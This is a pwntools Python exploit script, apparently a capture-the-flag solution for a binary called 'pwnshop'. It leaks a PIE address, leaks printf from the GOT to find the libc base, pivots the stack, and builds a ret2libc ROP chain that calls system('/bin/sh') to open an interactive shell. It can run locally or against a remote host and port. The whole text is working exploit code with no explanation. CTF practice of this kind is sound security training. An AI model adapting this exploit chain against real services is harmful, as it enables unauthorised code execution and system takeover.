from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

# exe = './pwnshop'
exe = './pwnshop_patched'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

library = './libc6_2.23-0ubuntu11.2_amd64.so'
libc = context.binary = ELF(library, checksec=True)

sh = start()
# pause()
sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'?', b'a')

## LEAKING PIE
sh.sendlineafter(b'?', b'A' * 7) 
sh.recvline()
get = unpack(sh.recv(6) + b'\x00' * 2)
log.success('LEAKED PIE --> %#0x', get)

elf.address = get - 0x40c0 # 16576
log.info(f'PIE BASE --> {hex(elf.address)}')

rop = ROP(elf)
# sub_rsp_gadget = rop.find_gadget(['sub rsp', '0x28', 'ret'])[0] # sub rsp, 0x28; ret;
sub_rsp_gadget = elf.address + 0x1219
log.success(f'STACK PIVOT GADGET --> {hex(sub_rsp_gadget)}')
rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
log.success(f'RDI GADGET --> {hex(rdi_gadget)}')
# sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', b'1')

# ROP PAYLOAD
p = flat([
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a
])

# calculate padding for our second payload (stack pivot)
rip_offset = 72
padding = rip_offset - len(p)
log.info(f'padding --> {padding}')

## LEAKING PRINTF@GOT
pay = flat([
    asm('nop') * padding,
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a, # buy option
    sub_rsp_gadget
])

## LEAKING READ@GOT
# pay = flat([
#     asm('nop') * padding,
#     rdi_gadget,
#     elf.got['read'],
#     elf.plt['puts'],
#     elf.address + 0x132a, # buy option
#     sub_rsp_gadget
# ])

# sh.sendlineafter(b':', pay)
sh.sendafter(b':', pay)
leaked_libc = sh.recvline().strip()
# print(leaked_libc)
leaked_libc = unpack(leaked_libc.ljust(8,b'\x00'))
log.success(f'Leaked LIBC printf --> {hex(leaked_libc)}')

## CALCULATING LIBC BASE
libc.address = leaked_libc - libc.sym['printf']
log.success('LIBC BASE --> %#0x', libc.address) 

ret_addr = rop.find_gadget(['ret'])[0]
log.success(f'ret gadget --> {ret_addr}')

## RET2LIBC PAYLOAD
# payload = flat([
#     asm('nop') * padding,
#     ret_addr,
#     rdi_gadget,
#     next(libc.search(b'/bin/sh\x00')),
#     libc.sym['system'],
#     sub_rsp_gadget
# ])

## USING ROPSTAR
libcrop = ROP(libc)
libcrop.call(rop.find_gadget(['ret'])[0])
libcrop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
libcrop.call(sub_rsp_gadget)
payload = asm('nop') * 40 
payload += libcrop.chain()
log.info(libcrop.dump())
print(payload)

sh.sendlineafter(b':', payload)

sh.interactive()
